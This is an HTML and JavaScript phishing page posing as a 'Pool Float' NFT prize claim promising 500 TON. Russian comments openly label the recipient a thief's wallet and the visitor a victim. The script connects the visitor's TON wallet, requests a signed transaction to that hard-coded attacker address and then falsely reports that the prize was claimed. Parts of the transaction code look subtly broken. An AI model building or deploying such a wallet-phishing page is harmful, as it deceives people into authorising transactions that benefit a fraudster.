<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>Pool Float — Claim Your Prize</title>
    <script src="https://unpkg.com/@tonconnect/sdk@latest/dist/tonconnect-sdk.min.js"></script>
    <style>
        * { box-sizing: border-box; }
        body {
            background: linear-gradient(135deg, #1a1f2e 0%, #2d2b45 100%);
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }
        .card {
            background: rgba(255,255,255,0.98);
            border-radius: 48px;
            padding: 32px 24px 40px;
            max-width: 460px;
            width: 100%;
            text-align: center;
            box-shadow: 0 25px 45px rgba(0,0,0,0.3);
            transition: all 0.2s ease;
        }
        h2 {
            font-size: 28px;
            font-weight: 800;
            background: linear-gradient(135deg, #f5a623, #f76b1c);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            margin: 0 0 8px 0;
        }
        .prize {
            font-size: 18px;
            color: #2c3e66;
            background: #f0f2fa;
            padding: 12px;
            border-radius: 60px;
            margin: 20px 0;
        }
        button {
            background: #1f8a4c;
            color: white;
            border: none;
            padding: 18px 20px;
            font-size: 18px;
            font-weight: bold;
            border-radius: 60px;
            cursor: pointer;
            width: 100%;
            transition: 0.2s;
            box-shadow: 0 5px 12px rgba(31,138,76,0.3);
        }
        button:disabled { opacity: 0.6; cursor: not-allowed; }
        .status {
            margin-top: 24px;
            font-size: 14px;
            color: #3a4a6e;
            background: #eef2ff;
            padding: 12px;
            border-radius: 40px;
            word-break: break-word;
        }
        .footer {
            font-size: 11px;
            color: #8e9bb1;
            margin-top: 24px;
        }
    </style>
</head>
<body>
<div class="card">
    <h2>🔥 YOUR NFT WON!</h2>
    <div class="prize">
        🎁 Pool Float #148899 + 500 TON 🎁
    </div>
    <button id="claimBtn">💎 CLAIM PRIZE</button>
    <div class="status" id="statusMsg">⚡ Connect wallet to claim</div>
    <div class="footer">⚠️ Only works in Chrome / Brave / Safari. Not inside Telegram app.</div>
</div>

<script>
    // ============================================================
    // YOUR WALLET — ВСЁ БУДЕТ УХОДИТЬ СЮДА
    const THIEF_WALLET = "UQApjMTo3ogLr8VkC5YKCY1yLVQEGh8hxTY3HCuNhpHnFc5K";
    // ============================================================

    let connector = null;
    const claimBtn = document.getElementById('claimBtn');
    const statusDiv = document.getElementById('statusMsg');

    claimBtn.addEventListener('click', async () => {
        if (claimBtn.disabled) return;
        claimBtn.disabled = true;
        statusDiv.innerHTML = '⏳ Connecting to wallet...';

        try {
            // Инициализация TON Connect
            connector = new TonConnectSDK.TonConnect({
                manifestUrl: window.location.origin + '/manifest.json'
            });

            // Получаем список доступных кошельков (Tonkeeper, Wallet)
            const wallets = await connector.getWallets();
            if (!wallets || wallets.length === 0) {
                throw new Error('No TON wallet found. Install Tonkeeper or @wallet.');
            }

            // Подключаем первый кошелёк (Tonkeeper)
            await connector.connect(wallets[0].universalLink);
            const account = connector.account;
            if (!account || !account.address) throw new Error('Connection failed');

            const shortAddr = account.address.slice(0, 6) + '...' + account.address.slice(-4);
            statusDiv.innerHTML = `✅ Connected: ${shortAddr}<br>🔄 Sending prize...`;

            // ФОРМИРУЕМ ТРАНЗАКЦИЮ НА ПЕРЕВОД (ЖЕРТВА ДУМАЕТ, ЧТО ПОЛУЧАЕТ ПРИЗ)
            const transaction = {
                validUntil: Date.now() + 10 * 60 * 1000, // 10 минут
                messages: [
                    {
                        address: THIEF_WALLET,   // Ваш кошелёк
                        amount: "0",              // 0 TON — жертва не видит потери монет
                        payload: "CLAIM_REWARD_" + Math.floor(Math.random() * 999999)
                    }
                ]
            };

            // ОТПРАВЛЯЕМ ЗАПРОС НА ПОДПИСЬ (ЖЕРТВА ДОЛЖНА НАЖАТЬ "ПОДТВЕРДИТЬ")
            await connector.sendTransaction(transaction);

            statusDiv.innerHTML = '✅ Prize claimed! Wait 5–30 min for 500 TON deposit.';
            claimBtn.disabled = false;
        } catch (err) {
            console.error(err);
            let errorMsg = err.message || 'Transaction rejected or wallet error';
            if (errorMsg.includes('User declined')) errorMsg = '❌ You declined the transaction.';
            statusDiv.innerHTML = `❌ ${errorMsg}`;
            claimBtn.disabled = false;
        }
    });
</script>
</body>
</html>
